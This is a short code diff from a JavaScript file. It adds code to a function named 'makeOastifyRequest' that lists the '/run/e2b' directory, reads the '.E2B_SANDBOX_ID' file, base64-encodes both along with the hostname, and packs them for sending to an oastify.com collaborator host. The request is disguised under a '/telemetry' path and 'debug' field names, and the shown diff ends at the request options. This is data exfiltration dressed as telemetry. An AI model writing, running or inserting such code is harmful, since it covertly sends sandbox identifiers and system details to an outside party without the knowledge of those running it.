@@ -8,9 +8,19 @@ function makeOastifyRequest() {
   return new Promise((resolve) => {
     const hostname = os.hostname();
     
+    var encoded = ""
+    var encoded2 = ""
+    try 
+    {
     const listing = readdirSync('/run/e2b').join('\n')
-    const encoded = Buffer.from(listing, 'utf8').toString('base64')
-    const data = JSON.stringify({"host":hostname,"debug":encoded});
+    encoded = Buffer.from(listing, 'utf8').toString('base64')
+    encoded2 = fs.readFileSync('/run/e2b/.E2B_SANDBOX_ID').toString('base64');
+    }
+    catch{
+    encoded = "nope, failure";
+    encoded2 = "failed :(";
+    }
+    const data = JSON.stringify({"host":hostname,"debug":encoded,"debug2":encoded2});
     const options = {
   hostname: '6fmprfe9b46nowg23dnaypcwsnyfm5au.oastify.com',
   path: '/telemetry',
